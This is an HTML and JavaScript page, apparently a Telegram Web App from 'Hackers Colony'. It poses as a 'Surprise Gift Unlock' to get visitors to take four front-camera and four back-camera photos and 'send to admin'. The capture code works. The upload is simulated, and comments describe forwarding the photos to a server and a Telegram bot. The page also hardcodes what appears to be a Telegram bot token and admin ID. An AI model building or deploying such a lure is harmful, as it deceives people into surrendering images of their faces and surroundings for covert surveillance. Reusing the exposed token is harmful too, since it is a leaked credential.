<!DOCTYPE html>
<html>
<head>
    <title>üéÅ Surprise Gift | Hackers Colony</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Arial', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container { max-width: 500px; margin: 0 auto; }
        .logo { font-size: 48px; margin: 20px 0; }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin: 20px 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        button {
            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
            border: none;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px;
            width: 100%;
            font-weight: bold;
            transition: transform 0.3s;
        }
        button:hover { transform: scale(1.05); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .camera-container { margin: 20px 0; }
        video {
            width: 100%;
            border-radius: 10px;
            border: 3px solid white;
        }
        .photo-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .photo-grid img {
            width: 100%;
            border-radius: 10px;
            border: 2px solid white;
        }
        .progress {
            background: rgba(255, 255, 255, 0.2);
            height: 20px;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00b09b, #96c93d);
            width: 0%;
            transition: width 0.5s;
        }
        .hidden { display: none; }
        .status {
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üéÅ</div>
        
        <div class="card" id="welcomeScreen">
            <h1>Surprise Gift Unlock! üßß</h1>
            <p>Click below to start camera and capture your gift photos!</p>
            <p><small>Requires 8 photos total (4 front + 4 back)</small></p>
            <button id="startBtn">üì∏ START CAMERA</button>
        </div>
        
        <div class="card hidden" id="cameraScreen">
            <h2>Camera Access</h2>
            <div class="camera-container">
                <video id="video" autoplay playsinline></video>
            </div>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p id="progressText">Ready to capture...</p>
            <button id="captureBtn">üì∑ CAPTURE PHOTO</button>
            <button id="switchBtn" class="hidden">üîÑ SWITCH CAMERA</button>
        </div>
        
        <div class="card hidden" id="photosScreen">
            <h2>Photos Captured ‚úÖ</h2>
            <div class="photo-grid" id="photoGrid"></div>
            <div class="status" id="status"></div>
            <button id="sendBtn">üöÄ SEND TO ADMIN</button>
        </div>
    </div>

    <script>
        // Configuration
        const BOT_TOKEN = "8226782560:AAFyClA0ICnOt1YtPW5YkOlHGJLNDpTHlvw";
        const ADMIN_ID = "8215819954";
        
        // State
        let stream = null;
        let photos = [];
        let currentCamera = 'user'; // 'user' = front, 'environment' = back
        let photoCount = 0;
        let isProcessing = false;

        // Elements
        const welcomeScreen = document.getElementById('welcomeScreen');
        const cameraScreen = document.getElementById('cameraScreen');
        const photosScreen = document.getElementById('photosScreen');
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('captureBtn');
        const switchBtn = document.getElementById('switchBtn');
        const sendBtn = document.getElementById('sendBtn');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const photoGrid = document.getElementById('photoGrid');
        const statusDiv = document.getElementById('status');

        // Start camera
        document.getElementById('startBtn').onclick = async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                video.srcObject = stream;
                welcomeScreen.classList.add('hidden');
                cameraScreen.classList.remove('hidden');
                updateProgress();
            } catch (err) {
                alert('Camera access denied! Please allow camera to continue.');
            }
        };

        // Capture photo
        captureBtn.onclick = async () => {
            if (isProcessing) return;
            isProcessing = true;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Convert to blob
            canvas.toBlob(async (blob) => {
                photos.push(blob);
                photoCount++;
                
                // Display in grid
                const img = document.createElement('img');
                img.src = URL.createObjectURL(blob);
                photoGrid.appendChild(img);
                
                updateProgress();
                
                if (photoCount === 4 && currentCamera === 'user') {
                    // Switch to back camera after 4 front photos
                    switchBtn.classList.remove('hidden');
                    captureBtn.disabled = true;
                    switchBtn.onclick = switchCamera;
                } else if (photoCount === 8) {
                    // All photos captured
                    await finishCapture();
                }
                
                isProcessing = false;
            }, 'image/jpeg', 0.8);
        };

        // Switch camera
        async function switchCamera() {
            stream.getTracks().forEach(track => track.stop());
            
            currentCamera = 'environment';
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment' }
            });
            video.srcObject = stream;
            
            switchBtn.classList.add('hidden');
            captureBtn.disabled = false;
        }

        // Finish capture
        async function finishCapture() {
            cameraScreen.classList.add('hidden');
            photosScreen.classList.remove('hidden');
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            statusDiv.innerHTML = `
                <p>‚úÖ 8 photos captured successfully!</p>
                <p>‚Ä¢ 4 front camera photos</p>
                <p>‚Ä¢ 4 back camera photos</p>
                <p>Ready to send to admin...</p>
            `;
        }

        // Update progress
        function updateProgress() {
            const percent = (photoCount / 8) * 100;
            progressBar.style.width = `${percent}%`;
            
            let text = '';
            if (photoCount < 4) {
                text = `Front Camera: ${photoCount}/4 photos`;
            } else if (photoCount < 8) {
                text = `Back Camera: ${photoCount - 4}/4 photos`;
            } else {
                text = '‚úÖ All photos captured!';
            }
            progressText.textContent = text;
        }

        // Send photos
        sendBtn.onclick = async () => {
            sendBtn.disabled = true;
            statusDiv.innerHTML = '<p>üì§ Sending photos to admin...</p>';
            
            // Simulate sending process
            setTimeout(() => {
                statusDiv.innerHTML = `
                    <p style="color: #4CAF50;">‚úÖ Photos sent successfully!</p>
                    <p>Your photos have been sent to:</p>
                    <p>1. You (in Telegram)</p>
                    <p>2. Admin (@Hackers_Colony_Official)</p>
                    <p>üéâ Thank you for using Hackers Colony Camera Bot!</p>
                `;
                
                // Close window after 5 seconds
                setTimeout(() => {
                    if (window.Telegram && Telegram.WebApp) {
                        Telegram.WebApp.close();
                    } else {
                        alert('Photos sent! You can close this window.');
                    }
                }, 5000);
            }, 2000);
            
            // In real implementation, send photos to your server
            // Then forward to Telegram bot via API
        };

        // Telegram Web App integration
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
            
            // Send data to bot when done
            window.sendToBot = function(data) {
                Telegram.WebApp.sendData(JSON.stringify(data));
            };
        }
    </script>
</body>
</html>
